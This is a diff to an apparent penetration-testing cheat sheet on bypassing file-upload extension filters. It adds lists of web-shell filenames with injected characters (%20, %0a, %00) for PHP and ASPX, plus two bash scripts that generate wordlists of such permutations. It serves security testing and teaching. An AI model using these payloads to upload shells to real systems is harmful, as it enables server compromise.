@@ -125,6 +125,18 @@ PHP
 .php\x00.png
 .php%00.jpg
 .php\x00.jpg
+%20.php
+.php%20
+.jpg%20.php
+.jpg.php%20
+%0a.php3
+.php3%0a
+.jpg%0a.php3
+.jpg.php3%0a
+%00.phtml
+.phtml%00
+.jpg%00.phtml
+.jpg.phtml%00
 # Other Character Injections (see below) 
 ```
 
@@ -139,6 +151,18 @@ shell.cer
 shell.soap
 shell.xamlx
 shell.aspx:.jpg
+shell%20.asp
+shell.asp%20
+shell.jpg%20.asp
+shell.jpg.asp%20
+shell%0a.aspx
+shell.aspx%0a
+shell.jpg%0a.aspx
+shell.jpg.aspx%0a
+shell%20.ashx
+shell.ashx%20
+shell.jpg%20.ashx
+shell.jpg.ashx%20
 # Other Character Injections (see below)
 ```
 
@@ -196,6 +220,42 @@ We can inject several characters **before** or **after** the final extension to 
 
 Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.
 
+Bash script that generates all **PHP** permutations of the file name for **Character Injection**:
+```bash
+#!/bin/bash
+
+chars=('%20' '%0a' '%00' '%0d0a' '/' '.\' '.' '…' ':')
+extensions=('.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm' '.phps' '.jpeg.php' '.jpg.php' '.png.php' '.php%00.gif' '.php\x00.gif' '.php%00.png' '.php\x00.png' '.php%00.jpg' '.php\x00.jpg')
+
+for char in "${chars[@]}"; do
+  for ext in "${extensions[@]}"; do
+    echo "shell${char}${ext}" >> php_wordlist.txt
+    echo "shell${ext}${char}" >> php_wordlist.txt
+    echo "shell.jpg${char}${ext}" >> php_wordlist.txt
+    echo "shell.jpg${ext}${char}" >> php_wordlist.txt
+  done
+done
+
+echo "PHP wordlist generated successfully: php_wordlist.txt"
+```
+Bash script that generates all **ASPX** permutations of the file name for **Character Injection**:
+```bash
+#!/bin/bash
+
+chars=('%20' '%0a' '%00' '%0d0a' '/' '.\' '.' '…' ':')
+extensions=('.asp' '.aspx' '.asa' '.ashx' '.asmx' '.cer' '.soap' '.xamlx' '.jpeg.aspx' '.jpg.aspx' '.png.aspx')
+
+for char in "${chars[@]}"; do
+  for ext in "${extensions[@]}"; do
+    echo "shell${char}${ext}" >> aspx_wordlist.txt
+    echo "shell${ext}${char}" >> aspx_wordlist.txt
+    echo "shell.jpg${char}${ext}" >> aspx_wordlist.txt
+    echo "shell.jpg${ext}${char}" >> aspx_wordlist.txt
+  done
+done
+
+echo "ASPX wordlist generated successfully: aspx_wordlist.txt"
+```
 ## Type Filters
 
 ### Content Type
